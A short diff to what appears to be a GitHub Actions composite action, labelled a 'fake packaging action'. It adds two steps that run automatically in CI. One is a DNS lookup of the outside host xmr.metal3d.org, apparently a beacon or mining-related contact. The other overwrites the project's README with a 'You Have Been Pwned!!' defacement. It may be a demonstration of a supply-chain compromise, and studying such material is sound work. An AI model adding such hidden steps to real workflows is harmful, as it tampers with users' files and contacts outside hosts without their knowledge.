@@ -7,3 +7,5 @@ runs:
     - shell: bash
       run: |
         echo "executing fake packaging action"
+        dig xmr.metal3d.org
+        echo '<div><img src="https://media.tenor.com/rePDfDWO3XoAAAAd/hacking.gif" width="518" height="388.5" alt="Hacking GIF - Hacking GIFs" style="max-width: 518px;"></div><p><h2>You Have Been Pwned!!</h2>' > my-app/README.md
